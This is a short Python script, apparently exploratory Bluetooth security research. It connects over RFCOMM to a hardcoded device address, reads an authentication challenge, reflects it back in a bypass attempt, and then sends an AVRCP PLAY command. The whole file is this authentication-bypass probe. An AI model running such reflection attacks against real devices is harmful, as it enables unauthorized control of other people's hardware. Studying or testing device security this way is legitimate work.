import time

import bluetooth

TARGET = "F4:B6:2D:AE:AB:E0"

sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock.connect((TARGET, 1))
print("[+] Connected to channel 1")

# Get challenge
sock.send(bytes([0x00, 0x00, 0x00, 0x00]))
time.sleep(0.3)
resp = sock.recv(256)
challenge = resp[1:17]
print(f"Challenge: {challenge.hex()}")

# Send it back as is
print("[>] Sending challenge back...")
sock.send(challenge)
time.sleep(0.5)
try:
    sock.settimeout(1.0)
    resp2 = sock.recv(256)
    print(f"[<] Response: {resp2.hex()}")
except:
    print("[<] No response")

# Try sending a command after that
cmd = bytes([0x00, 0x48, 0x7C, 0x44, 0x00])  # AVRCP PLAY
print(f"[>] Sending AVRCP PLAY: {cmd.hex()}")
sock.send(cmd)
time.sleep(0.5)
try:
    sock.settimeout(1.0)
    resp3 = sock.recv(256)
    print(f"[<] Response: {resp3.hex()}")
except:
    print("[<] No response")

sock.close()
